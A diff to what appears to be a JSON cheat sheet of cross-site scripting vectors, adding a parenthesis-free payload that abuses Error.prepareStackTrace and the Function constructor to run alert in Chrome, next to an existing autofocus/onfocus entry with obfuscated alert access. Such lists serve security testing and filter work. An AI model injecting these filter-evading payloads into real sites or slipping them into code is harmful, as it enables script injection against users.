@@ -1885,5 +1885,10 @@
     "description": "<xss> with onfocus using defaultView[] access (html)",
     "code": "<xss tabindex=1 autofocus onfocus=defaultView['a'+'lert'](1)>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "No parentheses using the function constructor in Error.prepareStackTrace",
+    "code": "<script>Object.prototype.message='alert\x281337\x29';Array.prototype.toString=Error.prototype.toString;Error.prepareStackTrace = Function;const x = new Error;x.valueOf=x.stack;+x;</script>",
+    "browsers": ["chrome"]
   }
 ]
